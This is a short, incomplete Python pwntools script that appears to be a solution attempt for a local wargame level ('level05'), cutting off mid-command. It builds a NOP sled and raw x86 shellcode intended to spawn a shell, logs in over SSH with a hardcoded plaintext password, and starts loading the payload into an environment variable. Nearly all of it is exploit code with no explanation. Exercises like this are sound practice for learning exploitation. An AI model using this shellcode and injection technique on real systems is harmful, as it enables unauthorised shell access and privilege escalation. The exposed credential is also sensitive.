from pwn import *
import os

padding = b"A" * 1000;
shellcode = b"\x90" * 1000 + b"\x99\x6a\x0b\x58\x60\x59\xcd\x80"

ssh = ssh(user='level05', host='127.0.0.1', port=2222, password='3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN')

prog = ssh.run('export MY_VAR=')
